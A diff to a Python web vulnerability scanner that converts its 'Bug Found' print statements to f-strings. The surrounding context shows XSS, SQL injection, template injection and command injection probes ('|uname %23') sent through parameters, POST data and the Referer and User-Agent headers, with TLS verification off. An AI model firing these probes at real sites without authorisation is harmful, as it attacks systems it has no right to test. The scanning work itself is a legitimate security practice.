@@ -112,7 +112,7 @@ class paramscanner: # Scanner Module
 					r=requests.get(url.replace('*',payload2),headers={'User-agent':uagent(cagent=cagent)},cookies=co,verify=False,allow_redirects=redir,timeout=tim,proxies=proxy)
 					if payload.encode('utf-8') in r.content:
 						j=url.replace('*',payload2)
-						print(`Bug Found : XSS Reflected, Payload : {payload}, Exploit : {j}`)
+						print(f"""Bug Found : XSS Reflected, Payload : {payload}, Exploit : {j}""")
 						break
 			else:
 				pass
@@ -135,7 +135,7 @@ class paramscanner: # Scanner Module
 						r=requests.get(url.replace(params, params + str(payload2).strip()),headers={'User-agent':uagent(cagent=cagent)},cookies=co,verify=False,allow_redirects=redir,timeout=tim,proxies=proxy)
 						if payload.encode('utf-8') in r.content:
 							j=url.replace(params, params + str(payload2).strip())
-							print(`Bug Found : XSS Reflected, Payload : {payload}, Exploit : {j}`)
+							print(f"""Bug Found : XSS Reflected, Payload : {payload}, Exploit : {j}""")
 							break
 				else:
 					continue
@@ -164,7 +164,7 @@ class paramscanner: # Scanner Module
 						sleep(slp)
 						r = requests.post(url,data=dat,cookies=co,verify=False,allow_redirects=redir,timeout=tim,headers={'User-agent':uagent(cagent=cagent)},proxies=proxy)
 						if payload.encode('utf-8') in r.content:
-							print(`Bug Found : XSS Reflected, Payload : {payload}, Method: [POST], VALUES: {dat}, URL : {r.url}`)
+							print(f"""Bug Found : XSS Reflected, Payload : {payload}, Method: [POST], VALUES: {dat}, URL : {r.url}""")
 							for i,c in dat.items():
 								dat[i] = c.replace(payload,'*')
 							break
@@ -190,7 +190,7 @@ class paramscanner: # Scanner Module
 					sleep(slp)
 					r = requests.post(url,data=dat,cookies=co,verify=False,allow_redirects=redir,timeout=tim,headers={'User-agent':uagent(cagent=cagent)},proxies=proxy)
 					if payload.encode('utf-8') in r.content:
-						print(`Bug Found : XSS Reflected, Payload : {payload}, Method: [POST], VALUES: {dat}, URL : {r.url}`)
+						print(f"""Bug Found : XSS Reflected, Payload : {payload}, Method: [POST], VALUES: {dat}, URL : {r.url}""")
 						for i,c in dat.items():
 							dat[i] = c.replace(payload,'')
 						break
@@ -214,7 +214,7 @@ class paramscanner: # Scanner Module
 			for f,i in errors.items():
 				ch=re.findall(i.encode('utf-8'),r.content)
 				if len(ch) > 0:
-					print(`Bug Found : SQL Injection, Payload : {payload}, Method: [POST], VALUES: {dat}, URL : {r.url}`)
+					print(f"""Bug Found : SQL Injection, Payload : {payload}, Method: [POST], VALUES: {dat}, URL : {r.url}""")
 					break
 			for i,d in dat.items():
 				dat[i] = d.replace(payload,'*')
@@ -228,7 +228,7 @@ class paramscanner: # Scanner Module
 			for f,i in errors.items():
 				ch=re.findall(i.encode('utf-8'),r.content)
 				if len(ch) > 0:
-					print(`Bug Found : SQL Injection, Payload : {payload}, Method: [POST], VALUES: {dat}, URL : {r.url}`)
+					print(f"""Bug Found : SQL Injection, Payload : {payload}, Method: [POST], VALUES: {dat}, URL : {r.url}""")
 					break
 			for i,d in dat.items():
 				dat[i] = d.replace(payload,'')
@@ -251,7 +251,7 @@ class paramscanner: # Scanner Module
 				ch = re.findall('Linux'.encode('utf-8'),r.content)
 				x = 0
 				if len(ch) > len(fir):
-					print(`Bug Found : Remote Code Execution (RCE), Payload : {payload}, Method: [POST], VALUES: {dat}, URL : {r.url}`)
+					print(f"""Bug Found : Remote Code Execution (RCE), Payload : {payload}, Method: [POST], VALUES: {dat}, URL : {r.url}""")
 					for i,d in dat.items():
 						dat[i] = d.replace(payload,'*')
 					break
@@ -268,7 +268,7 @@ class paramscanner: # Scanner Module
 				r = requests.post(url,data=dat,cookies=co,verify=False,allow_redirects=redir,timeout=tim,headers={'User-agent':uagent(cagent=cagent,one=True)},proxies=proxy)
 				ch = re.findall('Linux'.encode('utf-8'),r.content)
 				if len(ch) > len(fir):
-					print(`Bug Found : Remote Code Execution (RCE), Payload : {payload}, Method: [POST], VALUES: {dat}, URL : {r.url}`)
+					print(f"""Bug Found : Remote Code Execution (RCE), Payload : {payload}, Method: [POST], VALUES: {dat}, URL : {r.url}""")
 					for i,d in dat.items():
 						dat[i] = d.replace(payload,'')
 					break
@@ -298,7 +298,7 @@ class paramscanner: # Scanner Module
 				if len(ch) > len(fir):
 					r = requests.post(url,data=dat,headers={'User-agent':uagent(cagent=cagent)},cookies=co,verify=False,allow_redirects=redir,timeout=tim,proxies=proxy)
 					ch = re.findall('36'.encode('utf-8'),r.content)
-					print(`Bug Found : Template Injection (SSTI), Payload : {payload}, Method: [POST], VALUES: {dat}, URL : {r.url}`)
+					print(f"""Bug Found : Template Injection (SSTI), Payload : {payload}, Method: [POST], VALUES: {dat}, URL : {r.url}""")
 					for i,d in dat.items():
 						dat[i] = i.replace(payload,'*')
 					break
@@ -319,7 +319,7 @@ class paramscanner: # Scanner Module
 				r = requests.post(url,data=dat,headers={'User-agent':uagent(cagent=cagent)},cookies=co,verify=False,allow_redirects=redir,timeout=tim,proxies=proxy)
 				ch = re.findall('36'.encode('utf-8'),r.content)
 				if len(ch) > len(fir):
-					print(`Bug Found : Template Injection (SSTI), Payload : {payload}, Method: [POST], VALUES: {dat}, URL : {r.url}`)
+					print(f"""Bug Found : Template Injection (SSTI), Payload : {payload}, Method: [POST], VALUES: {dat}, URL : {r.url}""")
 					for i,d in dat.items():
 						dat[i] = i.replace(payload,'')
 					break
@@ -343,7 +343,7 @@ class paramscanner: # Scanner Module
 				ch=re.findall(i.encode('utf-8'),r.content)
 				if len(ch) > 0:
 					j=url.replace('*',payload.strip())
-					print(`Bug Found : SQL Injection, Payload : {payload}, Exploit: {j}, SQL Error: {i}`)
+					print(f"""Bug Found : SQL Injection, Payload : {payload}, Exploit: {j}, SQL Error: {i}""")
 					break
 		elif '*' not in url:
 			x = 0
@@ -358,7 +358,7 @@ class paramscanner: # Scanner Module
 					ch = re.findall(i.encode('utf-8'),r.content)
 					if len(ch) > 0:
 						j=url.replace(params, params + str(payload).strip())
-						print(`Bug Found : SQL Injection, Payload : {payload}, Param: {params}, Exploit: {j}, SQL Error: {i}`)
+						print(f"""Bug Found : SQL Injection, Payload : {payload}, Param: {params}, Exploit: {j}, SQL Error: {i}""")
 						break
 	def osinj(self,url,co,tim,deco,redir,cagent=None,proxy=None,slp=0,batch=None):
 		deco = deco - 1
@@ -376,7 +376,7 @@ class paramscanner: # Scanner Module
 				ch = re.findall('Linux'.encode('utf-8'),r.content)
 				if len(ch) > len(fir):
 					j=url.replace('*',payload.strip())
-					print(`Bug Found : Remote Code Execution (RCE), Payload : {payload}, Param: {params}, Exploit: {j}`)
+					print(f"""Bug Found : Remote Code Execution (RCE), Payload : {payload}, Param: {params}, Exploit: {j}""")
 					break
 		else:
 			x = 0
@@ -390,7 +390,7 @@ class paramscanner: # Scanner Module
 					ch = re.findall('Linux'.encode('utf-8'),r.content)
 					if len(ch) > len(fir):
 						j=url.replace(params, params + str(payload).strip())
-						print(`Bug Found : Remote Code Execution (RCE), Payload : {payload}, Param: {params}, Exploit: {j}`)
+						print(f"""Bug Found : Remote Code Execution (RCE), Payload : {payload}, Param: {params}, Exploit: {j}""")
 						break
 	def ssti(self,url,co,tim,deco,redir,cagent=None,proxy=None,slp=0,batch=None):
 		if '*' in url:
@@ -407,7 +407,7 @@ class paramscanner: # Scanner Module
 				ch = re.findall('36'.encode('utf-8'),r.content)
 				if len(ch) > len(fir):
 					j=url.replace('*',str(payload).strip())
-					print(`Bug Found : Template Injection, Payload : {payload}, Exploit: {j}`)
+					print(f"""Bug Found : Template Injection, Payload : {payload}, Exploit: {j}""")
 					break
 		elif '*' not in url:
 			sleep(slp)
@@ -424,7 +424,7 @@ class paramscanner: # Scanner Module
 					ch = re.findall('36'.encode('utf-8'),r.content)
 					if len(ch) > len(fir):
 						j=url.replace(params, params + str(payload).strip())
-						print(`Bug Found : Template Injection, Payload : {payload}, Exploit: {j}`)
+						print(f"""Bug Found : Template Injection, Payload : {payload}, Exploit: {j}""")
 						break
 class webscraper: # web scraper modules .. coming soon ^_^
 	def __init__(self):
@@ -446,10 +446,10 @@ class headers_scanner: # Header Scanner Module ;-;
 				sleep(slp)
 				r2 = requests.post(url,headers={"User-agent":uagent(cagent=cagent),"referrer":f"{payload}"},timeout=timeo,verify=False,allow_redirects=redir,cookies=cookie,proxies=proxy)
 				if payload.encode("utf-8") in r.content:
-					print(`Bug Found : XSS (in referrer header), Payload : {payload}, Method: [GET], URL: {r.url}`)
+					print(f"""Bug Found : XSS (in referrer header), Payload : {payload}, Method: [GET], URL: {r.url}""")
 					break
 				elif payload.encode("utf-8") in r2.content:
-					print(`Bug Found : XSS (in referrer header), Payload : {payload}, Method: [POST], URL: {r.url}`)
+					print(f"""Bug Found : XSS (in referrer header), Payload : {payload}, Method: [POST], URL: {r.url}""")
 					break
 				else:
 					continue
@@ -457,7 +457,7 @@ class headers_scanner: # Header Scanner Module ;-;
 				sleep(slp)
 				r = requests.post(url,headers={"User-agent":uagent(cagent=cagent),"referrer":f"{url} {payload}"},data=date,timeout=timeo,verify=False,allow_redirects=redir,cookies=cookie,proxies=proxy)
 				if payload.encode('utf-8') in r.content:
-					print(`Bug Found : XSS (in referrer header), Payload : {payload}, Method: [POST], URL: {r.url}`)
+					print(f"""Bug Found : XSS (in referrer header), Payload : {payload}, Method: [POST], URL: {r.url}""")
 					break
 				else:
 					continue
@@ -478,10 +478,10 @@ class headers_scanner: # Header Scanner Module ;-;
 				ch = re.findall(e.encode('utf-8'),r.content)
 				ch2 = re.findall(e.encode('utf-8'),r2.content)
 				if len(cch) < len(ch):
-					print(`Bug Found : SQL Injection (in referrer header), Payload : {payload}, Method: [GET], Error: {e}, URL: {r.url}`)
+					print(f"""Bug Found : SQL Injection (in referrer header), Payload : {payload}, Method: [GET], Error: {e}, URL: {r.url}""")
 					break
 				elif len(cch2) < len(ch2):
-					print(`Bug Found : SQL Injection (in referrer header), Payload : {payload}, Method: [POST], Error: {e}, URL: {r.url}`)
+					print(f"""Bug Found : SQL Injection (in referrer header), Payload : {payload}, Method: [POST], Error: {e}, URL: {r.url}""")
 					break
 				else:
 					continue
@@ -494,7 +494,7 @@ class headers_scanner: # Header Scanner Module ;-;
 				cch = re.findall(e.encode('utf-8'),r2.content)
 				ch = re.findall(e.encode('utf-8'),r.content)
 				if len(cch) < len(ch):
-					print(`Bug Found : SQL Injection (in referrer header), Payload : {payload}, Method: [POST], Error: {e}, URL: {r.url}`)
+					print(f"""Bug Found : SQL Injection (in referrer header), Payload : {payload}, Method: [POST], Error: {e}, URL: {r.url}""")
 					break
 				else:
 					continue
@@ -515,9 +515,9 @@ class headers_scanner: # Header Scanner Module ;-;
 				ch = re.findall('Linux'.encode('utf-8'),r.content)
 				ch2 = re.findall("Linux".encode("utf-8"),r2.content)
 				if len(ch) > len(cch):
-					print(`Bug Found : Remote Code Execution (in referrer header), Payload : {payload}, Method: [GET], URL: {r.url}`)
+					print(f"""Bug Found : Remote Code Execution (in referrer header), Payload : {payload}, Method: [GET], URL: {r.url}""")
 				elif len(ch2) > len(cch2):
-					print(`Bug Found : Remote Code Execution (in referrer header), Payload : {payload}, Method: [POST], URL: {r.url}`)
+					print(f"""Bug Found : Remote Code Execution (in referrer header), Payload : {payload}, Method: [POST], URL: {r.url}""")
 			else:
 				sleep(slp)
 				r2 = requests.post(url,headers={'User-agent':uagent(cagent=cagent,one=True)},data=date,timeout=timeo,verify=False,allow_redirects=redir,cookies=cookie,proxies=proxy)
@@ -526,7 +526,7 @@ class headers_scanner: # Header Scanner Module ;-;
 				ch = re.findall("Linux".encode("utf-8"),r.content)
 				cch = re.findall("Linux".encode("utf-8"),r2.content)
 				if len(ch) > len(cch):
-					print(`Bug Found : Remote Code Execution (in referrer header), Payload : {payload}, Method: [POST], URL: {r.url}`)
+					print(f"""Bug Found : Remote Code Execution (in referrer header), Payload : {payload}, Method: [POST], URL: {r.url}""")
 
 	def referrer_ssti(url,timeo=None,cookie=None,redir=None,deco=None,method=None,date=None,cagent=None,proxy=None,slp=0,batch=None):
 		payloads=['{{ 6*6 }}','<%= 6 * 6 %>','${6*6}']
@@ -545,11 +545,11 @@ class headers_scanner: # Header Scanner Module ;-;
  				ch = re.findall('36'.encode('utf-8'),r.content)
  				ch2 = re.findall("36".encode("utf-8"),r2.content)
  				if len(ch) > len(cch):
-					print(`Bug Found : Template Injection (in referrer header), Payload : {payload}, Method: [GET], URL: {url}`)
- 					break
+					 print(f"""Bug Found : Template Injection (in referrer header), Payload : {payload}, Method: [GET], URL: {url}""")
+					 break
  				elif len(ch2) > len(cch2):
-					print(`Bug Found : Template Injection (in referrer header), Payload : {payload}, Method: [POST], URL: {url}`)
- 					break
+					 print(f"""Bug Found : Template Injection (in referrer header), Payload : {payload}, Method: [POST], URL: {url}""")
+					 break
 			else:
 				sleep(slp)
 				r2 = requests.post(url,headers={"User-agent":uagent(cagent=cagent)},data=date,timeout=timeo,verify=False,allow_redirects=redir,cookies=cookie,proxies=proxy)
@@ -558,7 +558,7 @@ class headers_scanner: # Header Scanner Module ;-;
 				ch = re.findall("Linux".encode("utf-8"),r.content)
 				cch = re.findall("Linux".encode("utf-8"),r2.content)
 				if len(ch) > len(cch):
-					print(`Bug Found : Template Injection (in referrer header), Payload : {payload}, Method: [POST], URL: {url}`)
+					print(f"""Bug Found : Template Injection (in referrer header), Payload : {payload}, Method: [POST], URL: {url}""")
 					break
 	def user_agent_xss(url,timeo=None,cookie=None,redir=None,deco=None,method=None,date=None,cagent=None,proxy=None,slp=0,batch=None):
 		payloads=['">ScanT3r<svg/onload=confirm(/ScanT3r/)>web"','"><img src="x" OnMouseEnter=(confirm)(1)>ScanT3r','"><div onpointermove="alert(45)">MOVE HERE</div>','"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">','"><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">','<img src=x onerror=alert(1)>',"'><img src=x onerror=alert(1)>"]
@@ -569,16 +569,16 @@ class headers_scanner: # Header Scanner Module ;-;
 				sleep(slp)
 				r2 = requests.post(url,headers={"User-agent":uagent(cagent=cagent,payload=payload)},timeout=timeo,verify=False,allow_redirects=redir,cookies=cookie,proxies=proxy)
 				if payload.encode('utf-8') in r.content:
-					print(`Bug Found : XSS (in User-agent header), Payload : {payload}, Method: [GET], URL: {r.url}`)
+					print(f"""Bug Found : XSS (in User-agent header), Payload : {payload}, Method: [GET], URL: {r.url}""")
 					break
 				elif payload.encode('utf-8') in r2.content:
-					print(`Bug Found : XSS (in User-agent header), Payload : {payload}, Method: [POST], URL: {r.url}`)
+					print(f"""Bug Found : XSS (in User-agent header), Payload : {payload}, Method: [POST], URL: {r.url}""")
 					break
 			else:
 				sleep(slp)
 				r = requests.post(url,headers={"User-agent":uagent(cagent=cagent,payload=payload)},data=date,timeout=timeo,verify=False,allow_redirects=redir,cookies=cookie,proxies=proxy)
 				if payload.encode('utf-8') in r.content:
-					print(`Bug Found : XSS (in User-agent header), Payload : {payload}, Method: [POST], URL: {r.url}`)
+					print(f"""Bug Found : XSS (in User-agent header), Payload : {payload}, Method: [POST], URL: {r.url}""")
 					break
 	def user_agent_sqli(url,timeo=None,cookie=None,redir=None,deco=None,method=None,date=None,cagent=None,proxy=None,slp=0,batch=None):
 		payload='"'
@@ -597,10 +597,10 @@ class headers_scanner: # Header Scanner Module ;-;
 				ch = re.findall(e.encode('utf-8'),r.content)
 				ch2 = re.findall(e.encode("utf-8"),r2.content)
 				if len(ch) > len(cch):
-					print(`Bug Found : SQL Injection (in User-agent header), Payload : {payload}, Method: [GET], Error: {e}, URL: {r.url}`)
+					print(f"""Bug Found : SQL Injection (in User-agent header), Payload : {payload}, Method: [GET], Error: {e}, URL: {r.url}""")
 					break
 				elif len(ch2) > len(cch2):
-					print(`Bug Found : SQL Injection (in User-agent header), Payload : {payload}, Method: [POST], Error: {e}, URL: {r.url}`)
+					print(f"""Bug Found : SQL Injection (in User-agent header), Payload : {payload}, Method: [POST], Error: {e}, URL: {r.url}""")
 					break
 		else:
 			sleep(slp)
@@ -611,7 +611,7 @@ class headers_scanner: # Header Scanner Module ;-;
 				ch = re.findall(e.encode("utf-8"),r.content)
 				cch = re.findall(e.encode("utf-8"),r2.content)
 				if len(ch) > len(cch):
-					print(`Bug Found : SQL Injection (in User-agent header), Payload : {payload}, Method: [POST], Error: {e}, URL: {r.url}`)
+					print(f"""Bug Found : SQL Injection (in User-agent header), Payload : {payload}, Method: [POST], Error: {e}, URL: {r.url}""")
 					break
 	def user_agent_rce(url,timeo=None,cookie=None,redir=None,deco=None,method=None,date=None,cagent=None,proxy=None,slp=0,batch=None):
 		payloads = ["'|uname %23",'"|uname %23',"|uname %23"]
@@ -630,9 +630,9 @@ class headers_scanner: # Header Scanner Module ;-;
 				ch = re.findall('Linux'.encode('utf-8'),r.content)
 				ch2 = re.findall('Linux'.encode("utf-8"),r2.content)
 				if len(ch) > len(cch):
-					print(`Bug Found : Remote Code Execution (in User-agent header), Payload : {payload}, Method: [GET], URL: {r.url}`)
+					print(f"""Bug Found : Remote Code Execution (in User-agent header), Payload : {payload}, Method: [GET], URL: {r.url}""")
 				elif len(ch2) > len(cch2):
-					print(`Bug Found : Remote Code Execution (in User-agent header), Payload : {payload}, Method: [POST], URL: {r.url}`)
+					print(f"""Bug Found : Remote Code Execution (in User-agent header), Payload : {payload}, Method: [POST], URL: {r.url}""")
 			else:
 				sleep(slp)
 				r2 = requests.post(url,headers={"User-agent":uagent(cagent=cagent,one=True)},data=date,timeout=timeo,verify=False,allow_redirects=redir,cookies=cookie,proxies=proxy)
@@ -641,4 +641,4 @@ class headers_scanner: # Header Scanner Module ;-;
 				ch = re.findall('Linux'.encode("utf-8"),r.content)
 				cch = re.findall('Linux'.encode("utf-8"),r2.content)
 				if len(ch) > len(cch):
-					print(`Bug Found : Remote Code Execution (in User-agent header), Payload : {payload}, Method: [POST], URL: {r.url}`)
+					print(f"""Bug Found : Remote Code Execution (in User-agent header), Payload : {payload}, Method: [POST], URL: {r.url}""")
